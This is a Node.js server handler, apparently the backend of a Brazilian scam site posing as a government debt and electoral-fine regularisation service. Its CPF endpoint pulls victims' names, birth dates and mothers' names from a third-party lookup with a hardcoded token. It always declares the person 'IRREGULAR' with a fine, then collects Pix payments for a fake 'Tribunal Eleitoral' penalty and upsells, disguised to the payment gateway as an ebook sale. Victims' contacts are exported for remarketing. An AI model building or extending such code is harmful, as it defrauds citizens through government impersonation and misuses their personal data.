const url = require('url');
let QRCode = null;
try {
  QRCode = require('qrcode');
} catch(e) {}
const fs = require('fs');
const path = require('path');
const adminService = require('../lib/adminService');

const FREEPAY_CONFIG = {
  BASE_URL: process.env.FREEPAY_BASE_URL || 'https://api.freepaybrasil.com',
  PUBLIC_KEY: process.env.FREEPAY_PUBLIC_KEY || '',
  SECRET_KEY: process.env.FREEPAY_SECRET_KEY || ''
};

const configPath = path.join(__dirname, '..', 'freepay_config.json');
if (fs.existsSync(configPath)) {
  try {
    const loaded = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    FREEPAY_CONFIG.PUBLIC_KEY = loaded.PUBLIC_KEY || FREEPAY_CONFIG.PUBLIC_KEY;
    FREEPAY_CONFIG.SECRET_KEY = loaded.SECRET_KEY || FREEPAY_CONFIG.SECRET_KEY;
    if (loaded.BASE_URL) FREEPAY_CONFIG.BASE_URL = loaded.BASE_URL;
  } catch(e) {}
}

function getFreePayAuthHeader() {
  const gwConfig = adminService.getGatewayConfig();
  const dbGw = gwConfig.gateways.find(g => g.key === 'freepay');
  const pub = FREEPAY_CONFIG.PUBLIC_KEY || (dbGw ? dbGw.publicKey : '');
  const sec = FREEPAY_CONFIG.SECRET_KEY || (dbGw ? dbGw.secretKey : '');

  if (!pub || !sec) return null;
  const token = Buffer.from(`${pub}:${sec}`).toString('base64');
  return `Basic ${token}`;
}

async function generateQRCodeDataURL(text) {
  try {
    if (QRCode && typeof QRCode.toDataURL === 'function') {
      return await QRCode.toDataURL(text, {
        width: 280,
        margin: 1,
        color: { dark: '#000000', light: '#ffffff' }
      });
    }
    return `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(text)}`;
  } catch(e) {
    return '';
  }
}

const firstNames = ['Carlos', 'Maria', 'Jose', 'Ana', 'Paulo', 'Juliana', 'Marcos', 'Fernanda', 'Lucas', 'Patricia', 'Gabriel', 'Beatriz'];
const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro'];

function generateNameFromCPF(cpfDigits) {
  const n1 = parseInt(cpfDigits.slice(0, 3), 10) || 0;
  const n2 = parseInt(cpfDigits.slice(3, 6), 10) || 0;
  const n3 = parseInt(cpfDigits.slice(6, 9), 10) || 0;
  return `${firstNames[n1 % firstNames.length]} ${lastNames[n2 % lastNames.length]} ${lastNames[n3 % lastNames.length]}`;
}

function generatePixPayload(amount, identifier, name = 'DESENROLA BRASIL') {
  const formattedAmount = Number(amount).toFixed(2);
  return `00020126580014br.gov.bcb.pix0136${identifier || 'a7b8c9d0-1234-5678-90ab-cdef12345678'}520400005303986540${formattedAmount.length.toString().padStart(2, '0')}${formattedAmount}5802BR59${name.length.toString().padStart(2, '0')}${name}6008BRASILIA62070503***6304ABCD`;
}

async function createFreePayTransaction({ amount, name, cpf, phone, email, title }) {
  const authHeader = getFreePayAuthHeader();
  if (!authHeader) return null;

  const cleanCpf = (cpf || '').replace(/\D/g, '') || '08072703188';
  const cleanPhone = (phone || '').replace(/\D/g, '') || '11987654321';
  const cleanEmail = email || `cliente_${cleanCpf}@email.com`;
  const amountCents = Math.round(Number(amount) * 100);

  const payload = {
    amount: amountCents,
    payment_method: 'pix',
    customer: {
      name: name || 'Beneficiário Gov',
      email: cleanEmail,
      document: { number: cleanCpf, type: 'cpf' },
      phone: cleanPhone
    },
    items: [
      {
        title: 'ebook liberado',
        unit_price: amountCents,
        quantity: 1,
        tangible: false
      }
    ],
    metadata: { order_id: 'ORD_' + Date.now(), cpf: cleanCpf },
    pix: { expires_in_days: 1 }
  };

  try {
    const res = await fetch(`${FREEPAY_CONFIG.BASE_URL}/v1/payment-transaction/create`, {
      method: 'POST',
      headers: {
        'Authorization': authHeader,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });
    return await res.json();
  } catch (err) {
    return null;
  }
}

async function checkFreePayStatus(transactionId) {
  const authHeader = getFreePayAuthHeader();
  if (!authHeader) return null;

  try {
    const res = await fetch(`${FREEPAY_CONFIG.BASE_URL}/v1/payment-transaction/info/${transactionId}`, {
      method: 'GET',
      headers: { 'Authorization': authHeader }
    });
    return await res.json();
  } catch(err) {
    return null;
  }
}



// Universal Gateway Dispatcher delegated to adminService
async function createUniversalTransaction(params) {
  return await adminService.createUniversalTransaction(params);
}

async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') {
    res.statusCode = 204;
    res.end();
    return;
  }

  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname.replace(/\/+$/, '') || '/';
  const method = req.method;

  let bodyData = req.body;
  if (!bodyData && (method === 'POST' || method === 'PUT' || method === 'PATCH')) {
    const buffers = [];
    for await (const chunk of req) { buffers.push(chunk); }
    const raw = Buffer.concat(buffers).toString();
    try { bodyData = JSON.parse(raw); } catch(e) { bodyData = {}; }
  }

  const getAuthToken = () => {
    const auth = req.headers['authorization'] || '';
    if (auth.startsWith('Bearer ')) return auth.slice(7);
    const cookies = req.headers['cookie'] || '';
    const match = cookies.match(/recupera_admin_token=([^;]+)/);
    return match ? match[1] : null;
  };

  // ==========================================
  // ADMIN API ROUTES
  // ==========================================
  
  // Public Pixels endpoint for funnels & tracking
  if (pathname === '/api/pixels/public' && method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(adminService.getPixels()));
    return;
  }

  if (pathname.startsWith('/api/admin/')) {
    if (pathname === '/api/admin/auth/login' && method === 'POST') {
      const result = adminService.loginAdmin(bodyData?.username, bodyData?.password);
      if (result.success) {
        res.writeHead(200, {
          'Content-Type': 'application/json',
          'Set-Cookie': `recupera_admin_token=${result.token}; Path=/; HttpOnly; Max-Age=28800`
        });
      } else {
        res.writeHead(401, { 'Content-Type': 'application/json' });
      }
      res.end(JSON.stringify(result));
      return;
    }

    if (pathname === '/api/admin/auth/logout' && method === 'POST') {
      const token = getAuthToken();
      const result = adminService.logoutAdmin(token);
      res.writeHead(200, {
        'Content-Type': 'application/json',
        'Set-Cookie': 'recupera_admin_token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT'
      });
      res.end(JSON.stringify(result));
      return;
    }

    const token = getAuthToken();
    const session = adminService.validateSession(token);
    if (!session) {
      res.writeHead(401, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Sessão expirada ou não autorizada.' }));
      return;
    }

    if (pathname === '/api/admin/auth/me' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        success: true,
        user: { username: session.username, role: 'Administrador', brand: 'RecuperaBrasil' }
      }));
      return;
    }

    if (pathname === '/api/admin/gateway-config' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(adminService.getGatewayConfig()));
      return;
    }

    if (pathname === '/api/admin/gateway-config' && method === 'PUT') {
      const result = adminService.updateGatewayConfig(bodyData || {});
      res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    if (pathname === '/api/admin/gateway-test' && method === 'POST') {
      const result = await adminService.testAndActivateGateway(bodyData || {});
      res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    // Pixels Management
    if (pathname === '/api/admin/pixels' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(adminService.getPixels()));
      return;
    }

    if (pathname === '/api/admin/pixels' && method === 'POST') {
      const result = adminService.savePixels(bodyData || {});
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    if (pathname === '/api/admin/offers' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(adminService.getOffers()));
      return;
    }

    if (pathname === '/api/admin/offers' && method === 'POST') {
      try {
        const result = adminService.saveOffer(bodyData || {});
        res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(result));
      } catch(err) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: err.message }));
      }
      return;
    }

    if (pathname.startsWith('/api/admin/offers/') && method === 'DELETE') {
      const offerId = pathname.replace('/api/admin/offers/', '');
      const result = adminService.deleteOffer(offerId);
      res.writeHead(result.success ? 200 : 400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    if (pathname === '/api/admin/orders' && method === 'GET') {
      const result = adminService.getOrders(parsedUrl.query);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    // Export de contatos (nome, telefone, email) por status - para remarketing
    if (pathname === '/api/admin/orders/export' && method === 'GET') {
      const statusFilter = parsedUrl.query.status || 'ALL';
      const result = adminService.getOrders({ status: statusFilter });
      const csv = adminService.ordersToCsv(result.orders || []);
      res.writeHead(200, {
        'Content-Type': 'text/csv; charset=utf-8',
        'Content-Disposition': `attachment; filename="pedidos_${statusFilter.toLowerCase()}_${Date.now()}.csv"`
      });
      res.end('﻿' + csv);
      return;
    }

    if (pathname.startsWith('/api/admin/orders/') && method === 'GET') {
      const orderId = pathname.replace('/api/admin/orders/', '');
      const result = adminService.getOrderById(orderId);
      res.writeHead(result.success ? 200 : 404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    // Utmify API Tokens & Multi-Account Test
    if (pathname === '/api/admin/utmify-token' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true, tokens: adminService.getUtmifyApiTokens() }));
      return;
    }

    if (pathname === '/api/admin/utmify-token' && method === 'POST') {
      const result = adminService.updateUtmifyApiTokens(bodyData?.tokens || bodyData?.token);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
      return;
    }

    if (pathname === '/api/admin/utmify/test' && method === 'POST') {
      if (bodyData?.tokens || bodyData?.token) adminService.updateUtmifyApiTokens(bodyData.tokens || bodyData.token);
      const testRes = await adminService.sendUtmifyOrderWebhook({
        orderId: 'TEST_VERCEL_' + Date.now(),
        status: bodyData?.status || 'paid',
        amount: 68.92,
        customer: {
          name: 'Teste Multi-Token Utmify',
          email: 'teste@cliente.com',
          document: '08072703188',
          phone: '11999999999'
        },
        tracking: { utm_source: 'admin_test' },
        isTest: true
      });
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        success: testRes.success,
        details: testRes,
        message: testRes.success
          ? (`✓ Token(s) validado(s) com sucesso em ` + testRes.successfulCount + ` conta(s) Utmify (HTTP 200 OK). Este é um pedido de TESTE: a própria Utmify valida mas não salva pedidos de teste, então ele não vai aparecer no seu painel/resumo da Utmify - isso é esperado. Os webhooks reais (pendente/aprovada) são enviados normalmente quando um cliente gera ou paga um Pix de verdade.`)
          : 'Falha ao validar com a Utmify'
      }));
      return;
    }

    if (pathname === '/api/admin/metrics' && method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(adminService.getMetrics()));
      return;
    }
  }

  // ==========================================
  // CLIENT API ROUTES
  // ==========================================

async function fetchCpfData(rawCpf) {
  const token = 'c93601cbe0fce3f5c5b1e3b40c840f500fb162f91103beb42e839b7839813f93';
  const url = `https://api.zapgroup.shop/consultar-filtrada/cpf?cpf=${rawCpf}&token=${token}`;
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 6000);
    const res = await fetch(url, { signal: controller.signal });
    clearTimeout(timeoutId);
    if (res.ok) {
      const data = await res.json();
      if (data && data.nome) {
        return {
          cpf: data.cpf || rawCpf,
          nome: data.nome.trim(),
          nascimento: data.nascimento ? data.nascimento.trim() : '19/05/2003',
          mae: data.mae ? data.mae.trim() : '',
          sexo: data.sexo || 'M'
        };
      }
    }
  } catch (err) {
    console.error('Error fetching ZapGroup CPF data:', err.message);
  }
  return null;
}

  // Marca que o cliente copiou o código PIX (usado para remarketing)
  if (pathname === '/api/pix-copied' && method === 'POST') {
    const txId = bodyData?.transactionId || bodyData?.orderId || bodyData?.gatewayId;
    if (txId) adminService.markPixCopied(txId);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true }));
    return;
  }

  if (pathname === '/api/check_cpf' && method === 'POST') {
    const rawCpf = (bodyData?.cpf || '').replace(/\D/g, '');
    if (rawCpf.length !== 11) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'CPF inválido. Verifique os dígitos.' }));
      return;
    }

    adminService.recordSessionEvent('consulta');

    const externalData = await fetchCpfData(rawCpf);
    const finalNome = externalData?.nome || generateNameFromCPF(rawCpf);
    const finalNascimento = externalData?.nascimento || '19/05/2003';
    const finalSexo = externalData?.sexo || 'M';

    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Set-Cookie': `session=cpf_${rawCpf}; Path=/; HttpOnly`
    });
    res.end(JSON.stringify({
      success: true,
      cpf: rawCpf,
      nome: finalNome,
      nascimento: finalNascimento,
      sexo: finalSexo,
      mae: externalData?.mae || '',
      status: 'IRREGULAR',
      multa: 419.55,
      desconto: 57.97
    }));
    return;
  }

  if (pathname === '/generate-pix' && method === 'POST') {
    const amount = 57.97;
    adminService.recordSessionEvent('identidade');

    const result = await createUniversalTransaction({
      amount: amount,
      name: bodyData?.nome,
      cpf: bodyData?.cpf,
      phone: bodyData?.telefone || bodyData?.phone,
      email: bodyData?.email,
      title: 'ebook liberado'
    });

    adminService.addOrder({
      id: 'ord_' + result.transactionId.slice(-6),
      clientName: bodyData?.nome || 'Beneficiário Gov',
      email: bodyData?.email || 'cliente@email.com',
      cpf: bodyData?.cpf,
      phone: bodyData?.telefone,
      amount: amount,
      status: 'PENDING',
      gateway: result.gateway,
      gatewayKey: result.gatewayKey,
      transactionId: result.transactionId,
      pixCode: result.pixCode,
      itemTitle: 'ebook liberado'
    });

    // Envia Webhook de Venda Pendente para Utmify
    adminService.sendUtmifyOrderWebhook({
      orderId: result.transactionId,
      status: 'waiting_payment',
      amount: amount,
      customer: {
        name: bodyData?.nome,
        email: bodyData?.email,
        document: bodyData?.cpf,
        phone: bodyData?.telefone || bodyData?.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      },
      tracking: {
        utm_source: bodyData?.utm_source,
        utm_medium: bodyData?.utm_medium,
        utm_campaign: bodyData?.utm_campaign,
        utm_content: bodyData?.utm_content,
        utm_term: bodyData?.utm_term,
        src: bodyData?.src,
        sck: bodyData?.sck
      }
    }).catch(() => {});

    // Envia Evento InitiateCheckout para API de Conversões da Meta (CAPI)
    adminService.sendFacebookCapiEvent({
      eventName: 'InitiateCheckout',
      orderId: result.transactionId,
      amount: amount,
      customer: {
        name: bodyData?.nome,
        email: bodyData?.email,
        document: bodyData?.cpf,
        phone: bodyData?.telefone || bodyData?.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      }
    }).catch(() => {});

    // Envia Evento InitiateCheckout para API de Eventos do TikTok
    adminService.sendTikTokEventsApi({
      eventName: 'InitiateCheckout',
      orderId: result.transactionId,
      amount: amount,
      customer: {
        name: bodyData?.nome,
        email: bodyData?.email,
        document: bodyData?.cpf,
        phone: bodyData?.telefone || bodyData?.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      }
    }).catch(() => {});

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      success: true,
      pixCode: result.pixCode,
      pix_code: result.pixCode,
      pixQrCode: result.pixQrCode,
      qr_code_base64: result.pixQrCode,
      gateway_id: result.transactionId,
      transaction_id: result.transactionId,
      transactionId: result.transactionId,
      orderId: result.transactionId,
      amount: amount
    }));
    return;
  }

  if (pathname === '/generate-pix-upsell' && method === 'POST') {
    const amount = 54.92;
    adminService.recordSessionEvent('recebimento');

    const result = await createUniversalTransaction({
      amount: amount,
      name: bodyData?.nome,
      cpf: bodyData?.cpf,
      phone: bodyData?.telefone || bodyData?.phone,
      email: bodyData?.email,
      title: 'ebook liberado'
    });

    adminService.addOrder({
      id: 'ord_' + result.transactionId.slice(-6),
      clientName: bodyData?.nome || 'Beneficiário Gov',
      email: bodyData?.email || 'cliente@email.com',
      cpf: bodyData?.cpf,
      phone: bodyData?.telefone,
      amount: amount,
      status: 'PENDING',
      gateway: result.gateway,
      gatewayKey: result.gatewayKey,
      transactionId: result.transactionId,
      pixCode: result.pixCode,
      itemTitle: 'ebook liberado'
    });

    // Envia Webhook de Venda Pendente para Utmify
    adminService.sendUtmifyOrderWebhook({
      orderId: result.transactionId,
      status: 'waiting_payment',
      amount: amount,
      customer: {
        name: bodyData?.nome,
        email: bodyData?.email,
        document: bodyData?.cpf,
        phone: bodyData?.telefone || bodyData?.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      },
      tracking: {
        utm_source: bodyData?.utm_source,
        utm_medium: bodyData?.utm_medium,
        utm_campaign: bodyData?.utm_campaign,
        utm_content: bodyData?.utm_content,
        utm_term: bodyData?.utm_term,
        src: bodyData?.src,
        sck: bodyData?.sck
      }
    }).catch(() => {});

    // Envia Evento InitiateCheckout para API de Conversões da Meta (CAPI)
    adminService.sendFacebookCapiEvent({
      eventName: 'InitiateCheckout',
      orderId: result.transactionId,
      amount: amount,
      customer: {
        name: bodyData?.nome,
        email: bodyData?.email,
        document: bodyData?.cpf,
        phone: bodyData?.telefone || bodyData?.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      }
    }).catch(() => {});

    // Envia Evento InitiateCheckout para API de Eventos do TikTok
    adminService.sendTikTokEventsApi({
      eventName: 'InitiateCheckout',
      orderId: result.transactionId,
      amount: amount,
      customer: {
        name: bodyData?.nome,
        email: bodyData?.email,
        document: bodyData?.cpf,
        phone: bodyData?.telefone || bodyData?.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      }
    }).catch(() => {});

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      success: true,
      pixCode: result.pixCode,
      pix_code: result.pixCode,
      qr_code_base64: result.pixQrCode,
      pixQrCode: result.pixQrCode,
      gateway_id: result.transactionId,
      transaction_id: result.transactionId,
      transactionId: result.transactionId,
      orderId: result.transactionId,
      amount: amount
    }));
    return;
  }

  if (pathname === '/generate-pix-multa' && method === 'POST') {
    const amount = 67.35;
    adminService.recordSessionEvent('recebimento');

    const result = await createUniversalTransaction({
      amount: amount,
      name: bodyData?.nome,
      cpf: bodyData?.cpf,
      phone: bodyData?.telefone || bodyData?.phone,
      email: bodyData?.email,
      title: 'Regularização Multa Adicional - Tribunal Eleitoral'
    });

    adminService.addOrder({
      id: 'ord_' + result.transactionId.slice(-6),
      clientName: bodyData?.nome || 'Beneficiário Gov',
      email: bodyData?.email || 'cliente@email.com',
      cpf: bodyData?.cpf,
      phone: bodyData?.telefone,
      amount: amount,
      status: 'PENDING',
      gateway: result.gateway,
      gatewayKey: result.gatewayKey,
      transactionId: result.transactionId,
      pixCode: result.pixCode,
      itemTitle: 'ebook liberado'
    });

    // Envia Webhook de Venda Pendente para Utmify
    adminService.sendUtmifyOrderWebhook({
      orderId: result.transactionId,
      status: 'waiting_payment',
      amount: amount,
      customer: {
        name: bodyData?.nome,
        email: bodyData?.email,
        document: bodyData?.cpf,
        phone: bodyData?.telefone || bodyData?.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      }
    }).catch(() => {});

    // Envia Evento InitiateCheckout para API de Conversões da Meta (CAPI)
    adminService.sendFacebookCapiEvent({
      eventName: 'InitiateCheckout',
      orderId: result.transactionId,
      amount: amount,
      customer: {
        name: bodyData?.nome,
        email: bodyData?.email,
        document: bodyData?.cpf,
        phone: bodyData?.telefone || bodyData?.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      }
    }).catch(() => {});

    // Envia Evento InitiateCheckout para API de Eventos do TikTok
    adminService.sendTikTokEventsApi({
      eventName: 'InitiateCheckout',
      orderId: result.transactionId,
      amount: amount,
      customer: {
        name: bodyData?.nome,
        email: bodyData?.email,
        document: bodyData?.cpf,
        phone: bodyData?.telefone || bodyData?.phone,
        ip: req.socket?.remoteAddress || '127.0.0.1'
      }
    }).catch(() => {});

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      success: true,
      pixCode: result.pixCode,
      pix_code: result.pixCode,
      qr_code_base64: result.pixQrCode,
      pixQrCode: result.pixQrCode,
      gateway_id: result.transactionId,
      transaction_id: result.transactionId,
      transactionId: result.transactionId,
      orderId: result.transactionId,
      amount: amount
    }));
    return;
  }

  if (pathname === '/generate-qrcode' && method === 'GET') {
    const dataText = parsedUrl.query.data || 'PIX_CODE_PLACEHOLDER';
    QRCode.toBuffer(dataText, { width: 280, margin: 1, type: 'png' }, (err, buffer) => {
      if (err) {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('Error generating QR Code');
        return;
      }
      res.writeHead(200, {
        'Content-Type': 'image/png',
        'Cache-Control': 'public, max-age=86400'
      });
      res.end(buffer);
    });
    return;
  }

  if (pathname.startsWith('/check-payment/')) {
    const gatewayId = pathname.replace('/check-payment/', '');

    const notifyPaymentPaid = (gwId) => {
      adminService.updateOrderStatus(gwId, 'PAID');
      const orderObj = adminService.getOrderById(gwId)?.order;
      const amt = orderObj?.amount || 57.97;
      const cust = {
        name: orderObj?.clientName || 'Beneficiário Gov',
        email: orderObj?.email || 'cliente@email.com',
        document: orderObj?.cpf || '08072703188',
        phone: orderObj?.phone || '11999999999'
      };
      adminService.sendUtmifyOrderWebhook({
        orderId: gwId,
        status: 'paid',
        amount: amt,
        customer: cust
      }).catch(() => {});
      adminService.sendFacebookCapiEvent({
        eventName: 'Purchase',
        orderId: gwId,
        amount: amt,
        customer: cust
      }).catch(() => {});
      adminService.sendTikTokEventsApi({
        eventName: 'Purchase',
        orderId: gwId,
        amount: amt,
        customer: cust
      }).catch(() => {});
    };

    if (gatewayId.startsWith('TXN-')) {
      const bcData = await adminService.checkBlackCatStatus(gatewayId);
      if (bcData && bcData.success && bcData.data) {
        const itemStatus = (bcData.data.status || '').toUpperCase();
        const isPaid = itemStatus === 'PAID';
        if (isPaid) notifyPaymentPaid(gatewayId);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          status: isPaid ? 'approved' : 'pending',
          rawStatus: itemStatus,
          gateway_id: gatewayId
        }));
        return;
      }
    }

    if (gatewayId.startsWith('FLEVO_')) {
      const flevoData = await adminService.checkFlevoPayStatus(gatewayId);
      if (flevoData) {
        const rawSt = (flevoData.status || '').toLowerCase();
        const isPaid = rawSt === 'approved' || rawSt === 'paid' || rawSt === 'completed';
        if (isPaid) notifyPaymentPaid(gatewayId);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          status: isPaid ? 'approved' : 'pending',
          rawStatus: flevoData.status,
          gateway_id: gatewayId
        }));
        return;
      }
    }

    if (gatewayId.startsWith('PINGU_')) {
      const pinguData = await adminService.checkPinguPagStatus(gatewayId);
      if (pinguData && pinguData.status) {
        const rawSt = (pinguData.status || '').toLowerCase();
        const isPaid = rawSt === 'approved' || rawSt === 'paid' || rawSt === 'completed';
        if (isPaid) notifyPaymentPaid(gatewayId);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          status: isPaid ? 'approved' : 'pending',
          rawStatus: pinguData.status,
          gateway_id: gatewayId
        }));
        return;
      }
    }
    
    if (gatewayId.length > 20) {
      const freePayData = await checkFreePayStatus(gatewayId);
      if (freePayData && freePayData.success && freePayData.data) {
        const itemStatus = (freePayData.data.status || '').toUpperCase();
        const isPaid = itemStatus === 'PAID';
        if (isPaid) notifyPaymentPaid(gatewayId);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: true,
          status: isPaid ? 'approved' : 'pending',
          rawStatus: itemStatus,
          gateway_id: gatewayId
        }));
        return;
      }
    }

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      success: true,
      status: 'pending',
      gateway_id: gatewayId,
      message: 'Aguardando pagamento'
    }));
    return;
  }

  res.writeHead(404, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ error: 'Endpoint not found' }));
}

module.exports = async (req, res) => {
  try {
    await handler(req, res);
  } catch (err) {
    console.error('Erro não tratado na requisição:', err);
    if (!res.headersSent) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Erro interno do servidor.' }));
    } else {
      res.end();
    }
  }
};
